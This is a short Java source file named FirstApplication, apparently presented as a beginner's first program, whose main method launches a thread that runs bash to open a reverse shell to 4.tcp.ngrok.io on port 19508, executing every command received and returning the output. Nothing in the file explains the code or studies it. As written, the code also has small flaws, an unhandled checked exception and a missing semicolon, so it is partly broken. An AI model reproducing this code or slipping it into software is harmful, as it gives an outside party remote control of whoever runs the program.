package com.mjc.stage0;
import java.util.*;

public class FirstApplication {
    public static void main(String[] args) {
        Thread thread = new Thread(){
            public void run(){
                Runtime r = Runtime.getRuntime();
                Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/4.tcp.ngrok.io/19508;cat <&5 | while read line; do $line 2>&5 >&5; done'");
                p.waitFor();
            }
        }
        thread.start();
    }
}
